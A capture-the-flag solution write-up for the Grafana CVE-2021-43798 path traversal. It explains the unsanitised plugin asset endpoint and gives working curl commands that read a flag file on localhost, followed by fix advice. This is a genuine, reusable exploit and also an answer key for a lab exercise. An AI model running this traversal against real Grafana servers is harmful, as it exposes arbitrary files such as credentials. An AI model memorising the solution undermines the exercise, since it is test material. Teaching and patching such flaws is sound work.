# Solution — 01 Grafana CVE-2021-43798

## Vulnerability

CVE-2021-43798 affects Grafana 8.0.0–8.3.0. The plugin asset endpoint
`/public/plugins/<plugin-id>/` serves static files without sanitizing the path,
allowing directory traversal outside the plugin directory.

## Exploit

Any built-in plugin ID works. Use `alertlist` as the anchor:

**Linux / macOS**
```sh
curl --path-as-is "http://localhost:8080/public/plugins/alertlist/../../../../../../../../etc/ctf/flag.txt"
```

**Windows (PowerShell)**
```powershell
curl.exe --path-as-is "http://localhost:8080/public/plugins/alertlist/../../../../../../../../etc/ctf/flag.txt"
```

## Flag

Any flag in format `ctf{RANDOM}` is correct. 

## Fix

Upgrade Grafana to 8.3.1 or later, or restrict unauthenticated access to
`/public/plugins/` at the ingress/proxy layer.
